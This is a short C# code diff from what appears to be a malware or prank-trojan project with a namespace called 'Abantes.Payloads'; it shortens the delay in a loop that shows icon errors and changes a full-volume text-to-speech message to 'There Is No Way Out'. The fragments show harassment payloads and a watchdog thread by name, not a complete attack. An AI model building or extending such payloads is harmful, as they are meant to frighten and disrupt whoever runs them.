@@ -74,7 +74,7 @@ namespace Abantes.Payloads
                         Anoying.Display_Icons_Error();
                         break;
                 }
-                Thread.Sleep(10000);
+                Thread.Sleep(8000);
             }
         }
         public static void WathcDogThread()
@@ -267,7 +267,7 @@ namespace Abantes.Payloads
                 SpeechSynthesizer TTS = new SpeechSynthesizer();
                 TTS.SetOutputToDefaultAudioDevice();
                 TTS.Volume = 100;
-                TTS.Speak("There Is No Way");
+                TTS.Speak("There Is No Way Out");
             }
         }
     }
